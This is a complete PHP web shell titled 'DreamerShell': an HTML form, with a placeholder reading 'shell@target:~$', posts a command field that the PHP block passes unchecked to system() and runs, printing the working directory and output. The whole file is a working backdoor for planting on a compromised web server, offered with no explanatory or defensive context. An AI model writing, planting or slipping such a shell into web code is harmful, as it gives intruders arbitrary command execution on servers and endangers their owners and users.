<html>
<head>
<title>DreamerShell</title>
<style>
body {
font-family: 'Arial'; font-size: 22px;
background-color: #111111;
color: #ffffff;
}
</style>
</head>
<body>
<form method="post">
<input type="text" name="command" placeholder="shell@target:~$">
<input name="submit" type="submit" value="Execute">
</form>
</body>
</html>
<?php
if(isset($_POST['command'])) {
$command = $_POST['command'];
echo getcwd();
echo "<pre>";
$cmd = system ("$command");
}
?>
